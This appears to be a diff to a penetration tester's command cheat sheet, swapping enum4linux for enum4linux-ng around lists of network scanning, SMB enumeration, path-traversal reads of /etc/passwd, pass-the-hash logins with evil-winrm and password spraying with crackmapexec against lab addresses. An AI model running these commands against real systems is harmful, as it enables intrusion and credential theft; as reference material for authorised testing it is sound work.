@@ -53,7 +53,6 @@ nmap -sC -sV -p 139,445,80,21 192.168.56.201
 nmap -Pn -v -sS -F 192.168.56.0/24
 masscan -v -p 1-65535 --rate=10000 -e eth0 192.168.56.0/24
 masscan -v -p 1-65535,U:1-65535 --rate=10000 -e eth0 192.168.56.0/24
-enum4linux -u anonymous -p anonymous DC01.BREAKING.BAD
 gobuster dir -w `fzf-wordlists` -u http://192.168.56.0:8000/
 cme smb 192.168.56.0/24 -u anonymous -p anonymous --shares
 cme smb 192.168.56.0/24 -u '' -p '' --shares
@@ -86,7 +85,6 @@ smbserver.py SHUTDOWN .
 smbserver.py -smb2support SHUTDOWN .
 ffuf -c -w `fzf-wordlists` -u http://192.168.10.10/FUZZ
 nmblookup -A 192.168.10.10
-enum4linux -n 192.168.10.10
 nmap --script 'smb-enum*' --script-args unsafe=1 -T5 192.168.10.10
 smbmap -H 192.168.10.10
 smbmap -u guest -H 192.168.10.10
@@ -97,7 +95,6 @@ smbclient //192.168.56.101/SYSVOL -U BREAKING/Administrator
 smbclient -N //192.168.10.10/test
 smbclient -N -L 192.168.10.10
 nmap --script smb-enum-shares -p 139,445 -T4 -Pn 192.168.10.10
-enum4linux -a 192.168.10.10
 amap -d 192.168.10.10 4455
 nikto -host 192.168.10.10
 dotdotpwn -m payload -h 192.168.10.10 -x 80 -p request.req -k 'root:' -f /etc/passwd
@@ -158,4 +155,7 @@ evil-winrm -u serviceaccount -p P4ssw0rd -i 192.168.56.101
 evil-winrm -u serviceaccount -H c1c635aa12ae60b7fe39e28456a7bac6 -i 192.168.56.101
 cme smb 192.168.56.101 --continue-on-success -u users.txt -p passwords.txt
 crackmapexec smb 192.168.56.101 --continue-on-success -u users.txt -p passwords.txt
-smbpasswd -U BREAKING\serviceaccount -r 192.168.56.101
+smbpasswd -U BREAKING/serviceaccount -r 192.168.56.101
+enum4linux-ng -A 192.168.59.101
+enum4linux-ng -A -u BREAKING/serviceaccount -p 'P@ssword' 192.168.56.101
+enum4linux-ng -I -u BREAKING/serviceaccount -p 'P@ssword' 192.168.56.101
